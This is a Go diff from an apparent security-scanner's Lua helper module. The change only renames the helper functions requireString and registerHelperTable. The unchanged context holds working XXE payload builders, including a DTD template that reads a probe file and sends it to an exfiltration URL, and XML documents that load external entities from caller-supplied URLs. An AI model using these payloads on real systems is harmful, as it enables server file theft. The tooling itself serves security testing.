@@ -56,12 +56,12 @@ func xxeBaselineDocFn(L *lua.LState) int {
 }
 
 func xxeExtractSystemTarget(L *lua.LState) int {
-	L.Push(lua.LString(XXEExtractSystemTargetLua(requireString(L, 1))))
+	L.Push(lua.LString(XXEExtractSystemTargetLua(RequireString(L, 1))))
 	return 1
 }
 
 func xxeExtractExfilData(L *lua.LState) int {
-	L.Push(lua.LString(XXEExtractExfilDataLua(requireString(L, 1))))
+	L.Push(lua.LString(XXEExtractExfilDataLua(RequireString(L, 1))))
 	return 1
 }
 
@@ -78,8 +78,8 @@ func xxeOOBExfilProbeFileFn(L *lua.LState) int {
 // the literal `<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM ...">` is
 // fiddly to escape correctly across Lua's quoting rules.
 func xxeDTDTemplate(L *lua.LState) int {
-	exfilURL := requireString(L, 1)
-	probeFile := requireString(L, 2)
+	exfilURL := RequireString(L, 1)
+	probeFile := RequireString(L, 2)
 	out := `<!ENTITY % file SYSTEM "` + probeFile + `">` +
 		`<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM '` + exfilURL + `?d=%file;'>">` +
 		`%wrap;` +
@@ -89,7 +89,7 @@ func xxeDTDTemplate(L *lua.LState) int {
 }
 
 func xxeSystemOOBDoc(L *lua.LState) int {
-	canaryURL := requireString(L, 1)
+	canaryURL := RequireString(L, 1)
 	out := `<?xml version="1.0" encoding="UTF-8"?>` +
 		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "` + canaryURL + `">]>` +
 		`<foo>&xxe;</foo>`
@@ -98,7 +98,7 @@ func xxeSystemOOBDoc(L *lua.LState) int {
 }
 
 func xxeDTDLoaderDoc(L *lua.LState) int {
-	dtdURL := requireString(L, 1)
+	dtdURL := RequireString(L, 1)
 	out := `<?xml version="1.0" encoding="UTF-8"?>` +
 		`<!DOCTYPE foo SYSTEM "` + dtdURL + `">` +
 		`<foo>x</foo>`
@@ -107,5 +107,5 @@ func xxeDTDLoaderDoc(L *lua.LState) int {
 }
 
 func init() {
-	registerHelperTable("xxe", buildXXETable)
+	RegisterHelperTable("xxe", buildXXETable)
 }
